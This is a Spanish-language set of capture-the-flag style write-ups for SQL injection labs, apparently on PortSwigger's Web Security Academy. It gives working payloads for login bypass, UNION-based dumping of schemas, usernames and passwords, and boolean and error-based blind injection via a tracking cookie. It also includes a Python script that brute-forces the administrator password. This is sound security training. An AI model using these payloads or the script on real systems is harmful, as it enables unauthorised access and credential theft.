# Inyecciones SQL

## cheatsheet


## Laboratorios

### Reto 1 Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Para resolver el laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre uno o más productos no lanzados.

En la url podemos emplear una vulnerabilidad típica usando las comillas y comentando lo siguiente de esta forma podemos hacerlo:

```bash
https://web-security-academy.net/filter?category=Pets
```
Para explotarla podemos usar `test' or 1=1-- -` donde 1=1 siempre se va a dar  y los guiones posteriores sirven para comentar lo que viene siguiente

```bash
https://web-security-academy.net/filter?category=Pets' or 1=1-- -
```

Obtenemos todos los procutos esten o no lanzados. si quisieramos solo ver los que no estan lanzados , tendriamos que usar esta sentencia:

```bash
https://web-security-academy.net/filter?category=Pets' or released=0-- -
```


### Reto 2: Vulnerabilidad de inyección SQL que permite eludir el inicio de sesión

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realice un ataque de inyección SQL que inicie sesión en la aplicación como administrator usuario.

Para resolver este reto , he realizado un ataque parecido al reto anterior en un panel de login para ello he utilizado lo siguiente:

```bash
User: administrator
passwd: test' or 1=1-- -
```

De esta manera hacemos un bypass del login.

### Reto 3 Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Se puede usar un ataque UNION para recuperar los resultados de una consulta inyectada.

Para resolver el laboratorio, muestre la cadena de versión de la base de datos,  es importante destacar que las sentencias de SQL son distintas para cada base de datos.

Para lograrlo:

- Se intercepta la solicitud que filtra los productos por categoría y se modifica el parámetro ‘category’ hay que tener en cuenta que para extraer datos no nos vale lo anterior que muestra todo.

- Primero se determina cuántas columnas devuelve la consulta y cuáles aceptan datos de tipo texto podemos usar ORDER BY e ir probando en nuestro caso son dos columnas. 
```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

Esto es necesario para que el ataque UNION funcione correctamente, la letras a y b se deberian de mostrar en alguna parte de la página, la tabla `dual` es una tabla especial que tiene oracle de una fila y columna
 para hacer cálculos.

```
https://web-security-academy.net/filter?category=Pets' union select 'a','b' from dual-- -
```

- Una vez identificadas las columnas, se utiliza una inyección que consulta la tabla ‘v$version’, propia de Oracle, para obtener el valor del campo ‘BANNER’, que contiene información sobre la versión de la base de datos.

- Ejemplo de oracle
```
https://web-security-academy.net/filter?category=Pets' union select 'a',banner from v$version-- -
```

- Ejemplo de MySQL y Microsoft

```
https://web-security-academy.net/filter?category=Pets' union select 'a',@@version-- -
```

Otros ejemplos: 

- Extraer las bases de datos que hay en MYSQL

```
https://web-security-academy.net/filter?category=Pets' union select 'a',schema_name from information_schema.schemata-- -
```

Enumerararlas usando `group_concat()`para concatenar todos los nombres en una sola fila y poder verlos todos juntos

```
https://web-security-academy.net/filter?category=' union select NULL,group_concat(schema_name) from information_schema.schemata-- -
```

- Enumeramos todas las tablas de todas las bases de datos

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables-- -
```

- Enumeramos las tablas de una base de datos en específico por ejemplo 'academy_labs'

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='academy_labs'-- -
```

### Reto 4: ataque de inyección SQL, que enumera el contenido de la base de datos en bases de datos que no son de Oracle

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación para que pueda utilizar un ataque UNION para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión y la base de datos contiene una tabla que contiene nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, luego recuperar el contenido de la tabla para obtener el nombre de usuario y la contraseña de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrador usuario.

El objetivo final es extraer las credenciales de todos los usuarios (incluido el administrador) a partir de las siguientes etapas:

1º Descubrir cuántas columnas devuelve la consulta original y qué tipo de datos aceptan, usando un payload simple para comprobarlo.
2º Listar todas las tablas existentes en la base de datos consultando ‘information_schema.tables‘, una tabla especial que contiene metadatos.
3º Identificar la tabla que almacena los usuarios y contraseñas, observando su nombre en la respuesta.
4º Listar las columnas de esa tabla, consultando ‘information_schema.columns‘ y filtrando por el nombre de tabla que acabamos de encontrar.
5º Extraer los valores de las columnas relevantes, mostrando directamente los nombres de usuario y contraseñas de todos los usuarios.
6º Una vez obtenida la contraseña del administrador, podemos usarla para iniciar sesión en la aplicación y completar el laboratorio.


Para hacer un paso a paso :

primero comprobamos si es vulnerable a inyeccion SQL colocando `' -- -`

```
https://web-security-academy.net/filter?category=' -- -
```
Si vemos que nos devuelve algo y no un internal server error seguimos con el siguiente paso

```
https://web-security-academy.net/filter?category=' union select NULL,NULL-- -
```
Vamos a intentar extraer el esquema de la bases de datos de la siguienta manera

```
https://web-security-academy.net/filter?category=' union select NULL,schema_name from information_schema.schemata-- -
```

Elegimos la base de datos public es la que parece más interesante 

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
```

Mostramos las columnas de la BD public y de la tabla users_xguocv
```
https://web-security-academy.net/filter?category=' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users_ednwmh'-- -
```
Extraemos todos los usuarios y contraseñas de las tablas incluida la del administrado

```
https://web-security-academy.net/filter?category=' union select username_jgugaj,password_wfzhqa from public.users_ednwmh-- -
```
otra forma de hacerlo:

```
https://web-security-academy.net/filter?category=' union select NULL,concat(username_jgugaj,':',password_wfzhqa) from public.users_ednwmh-- -
```

## Reto 6: Ataque de inyección SQL, listando el contenido de la base de datos en Oracle

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.

La aplicación cuenta con una función de inicio de sesión y la base de datos contiene una tabla con nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, y luego recuperar su contenido para obtener los nombres de usuario y las contraseñas de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrator .

- Primero se determina cuántas columnas como en el caso anterior

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

Usamos la tabla `dual` es una tabla especial que tiene oracle de una fila y columna para hacer cálculos y comprobar si se ve los dos caracteres.

```
https://web-security-academy.net/filter?category=Pets' union select 'a','b' from dual-- -
```

Para obtener todas las tablas  usamos la siguiente sentencia:
```
https://web-security-academy.net/filter?category=' UNION SELECT table_name, null FROM all_tables-- -
```

para enumerar las columnas de la tabla de usuarios `USERS_PCJYFM` realizamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_PCJYFM'-- -
```
Por último enumeramos los usuarios y las contraseñas de los usuarios guardados.

```
https://web-security-academy.net/filter?category=' UNION SELECT USERNAME_UPRTIQ, PASSWORD_KJOVDN FROM USERS_PCJYFM-- -
```

## Reto 7: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. El primer paso de este tipo de ataque es determinar el número de columnas que devuelve la consulta. Posteriormente, se utilizará esta técnica en laboratorios posteriores para construir el ataque completo.

Para resolver el laboratorio, determine la cantidad de columnas devueltas por la consulta realizando un ataque UNION de inyección SQL que devuelva una fila adicional que contenga valores nulos.


1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 3-- -
```

3º usamos Null para comprobarlas 

```
https://web-security-academy.net/filter?category=Pet' union select NUll,NUll,NUll-- -
```

## Reto 8: Ataque UNION de inyección SQL, búsqueda de una columna que contiene texto

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, primero se debe determinar el número de columnas devueltas por la consulta. Puede hacerlo utilizando una técnica que aprendió en un laboratorio anterior . El siguiente paso es identificar una columna compatible con datos de cadena.

El laboratorio proporcionará un valor aleatorio que deberá incluir en los resultados de la consulta. Para resolverlo, realice un ataque de inyección SQL UNION que devuelva una fila adicional con el valor proporcionado. Esta técnica le ayudará a determinar qué columnas son compatibles con datos de cadena.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 3-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,'0LYbaS',NUll-- -
```

## Reto 9: Ataque UNION de inyección SQL, recuperando datos de otras tablas

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, es necesario combinar algunas de las técnicas aprendidas en laboratorios anteriores.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password.

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como el administratorusuario.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,NUll-- -
```

4º mostramos el contenido de las BD existentes 

```
https://web-security-academy.net/filter?category=' union select NUll,schema_name from information_schema.schemata-- -
```

5º Mostramos las tablas existentes de la BD "public"

```
https://web-security-academy.net/filter?category=' union select NUll,table_name from information_schema.tables where table_schema='public'-- -
```

6º Mostramos usuarios y contraseña de las tablas 

```
https://web-security-academy.net/filter?category=' union select username,password from public.users-- -
```

## Reto 10: Ataque UNION de inyección SQL, recuperando múltiples valores en una sola columna

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password.

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como el administrator usuario.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,NUll-- -
```

4º mostramos el contenido de las BD existentes 

```
https://web-security-academy.net/filter?category=' union select NUll,schema_name from information_schema.schemata-- -
```

5º Mostramos las tablas existentes de la BD "public"

```
https://web-security-academy.net/filter?category=' union select NUll,table_name from information_schema.tables where table_schema='public'-- -
```

6º Enumeramos las columnas de la tabla usuarios de la BD public
```
https://web-security-academy.net/filter?category=' union select NUll,column_name from information_schema.columns where table_schema='public' and table_name='users'-- -
```

7º Enumeramos los usuarios y las contraseñas
```
https://web-security-academy.net/filter?category=' union select NUll,username||':'||password from users-- -
```

## Reto 11: Inyección SQL ciega con respuestas condicionales

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

No se devuelven los resultados de la consulta SQL ni se muestran mensajes de error. Sin embargo, la aplicación incluye un Welcome backmensaje en la página si la consulta devuelve alguna fila.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password. Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administratorusuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.

- Solución:

La vulnerabilidad está en la cookie de tracking que la aplicación utiliza para análisis. Aprovechamos ese valor para inyectar condiciones booleanas y observar si se cumple o no, basándonos únicamente en si aparece un mensaje del tipo “Welcome back” en la respuesta.

Usamos esta técnica para:

Confirmar la existencia de una tabla ‘users‘ y un usuario ‘administrator‘.
Determinar la longitud exacta de la contraseña del administrador.
Extraer el valor carácter por carácter usando funciones como ‘SUBSTRING‘.


Un ejemplo sería:

1º comprobamos cuantas columnas tiene
Trakingid: AdfaSDFsDFa' order by 1-- -

Comprobamos que si se da la vulnerabilidad  nos devuelve "Welcome back" 

2º podemos probar si funciona colocando el Null, que en nuestro caso si funciona , ademas a proba si aparece una palabra que nosotros queramos en alguna parte de la Web

Trakingid: AdfaSDFsDFa' union select Null-- -

Trakingid: AdfaSDFsDFa' union select 'test'-- - 

Sin embargo vemos que no aparece nada en la web , es por eso que se llama `blind SQL` por lo tanto solo sabemos si nuestra query funciona cunado aparece y desaparece `Welcome back`

3º Lo siguiente que podemos probar probar los condicionales esto es: 

- Trakingid: AdfaSDFsDFa' and 'a'='a'-- -

Esto hace que si se da la condicion se muestre `Welcome back` y si no se da desaparece.

4º El siguiente paso seria utilizar query dentro de query esto quiere decir:

- Trakingid: AdfaSDFsDFa' and (select 'a')='a'-- -

de esta forma se nos devolvera `Welcome back`

5º El siguiente paso es como sabemos que hay un usuario administrator podemos ir probado 

- Trakingid: AdfaSDFsDFa' and (select 'a' from users where username='administrator')='a'-- -

6º El siguiente paso es ver si podemos sacar mas contenido con las siguiente sentencia, `substring(username,1,1)` hacemos lo mismo que la anterior 
pero de otra forma vemos que en el campo username el primer caracter es la 'a' que coincide con la 'a' de administrador y nos devuelve el welcome Back

- Trakingid: AdfaSDFsDFa' and (select substring(username,1,1) from users where username='administrator')='a'-- -

si problamos la siguiente sentencia esta no nos devolveria el mensaje esto es util porque podemos poner otro campo en vez del username, ed decir el password para 
ir sacando poco a poco la contraseña 

- Trakingid: AdfaSDFsDFa' and (select substring(username,2,1) from users where username='administrator')='a'-- -

Para el campo de contraseña: ¿El primer caracter de la contraseña es una 'a'? , si sale el mensaje si que lo es , si no sale 
el mensaje no lo es.

- Trakingid: AdfaSDFsDFa' and (select substring(password,1,1) from users where username='administrator')='a'-- -

7º Ahora vamos a intentar sacar la longitud de la contraseña, para ello solo saldra el mensaje si la longitud de la contraseña es mayor a 10.

- Trakingid: AdfaSDFsDFa' and (select 'a' from users where username='administrator' and length(password)>=20)='a'-- -

8º Vamos a hacer un script en python para que nos saque la contraseña rápida utilizando un ataque de fuerza bruta:

```python
#!/usr/bin/env python3

from pwn import log
from termcolor import colored
import requests
import signal
import string
import sys
import time

# Configuración general
TARGET_URL = "https://0a52006104667f7e81bf217b0076009b.web-security-academy.net"
TRACKING_ID_BASE = "F8zRFYtsp3KWQmFA"
SESSION_COOKIE = "Yo1gFnBAAOLMrV0wWCLTRKEj6Ra83Mam"
USERNAME = "administrator"
MAX_PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits

# Manejo de Ctrl+C
def def_handler(sig, frame):
    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
    p1.failure("Proceso detenido.")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Logging
p1 = log.progress("SQL Injection")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta...")
    time.sleep(1)

    password = ""
    p2 = log.progress("Contraseña descubierta")

    for position in range(1, MAX_PASSWORD_LENGTH + 1):
        for character in CHARS:
            injection = f"{TRACKING_ID_BASE}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='{USERNAME}')='{character}'-- -"
            cookies = {
                'TrackingId': injection,
                'session': SESSION_COOKIE
            }

            p1.status(f"Probando posición {position} con caracter '{character}'")

            try:
                r = requests.get(TARGET_URL, cookies=cookies, timeout=5)

                if "Welcome back!" in r.text:
                    password += character
                    p2.status(password)
                    break

            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error en la petición: {e}", "red"))
                continue

    return password


if __name__ == "__main__":
    print(colored("[*] Ataque iniciado...", "cyan"))
    final_password = makeSQLI()
    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))
```

## Reto 12: Inyección SQL ciega con errores condicionales 

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente según si la consulta devuelve filas o no. Si la consulta SQL genera un error, la aplicación devuelve un mensaje de error personalizado.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordNecesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administratorusuario.

Para resolver el laboratorio, inicie sesión como administrator usuario. 


Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'

Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9

Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9


Cookie: TrackingId=cMkoRqzxe2swLOUK'||(SELECT CASE WHEN substr(password,1,1)='r' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9

## ¿Qué es una SQLI ?

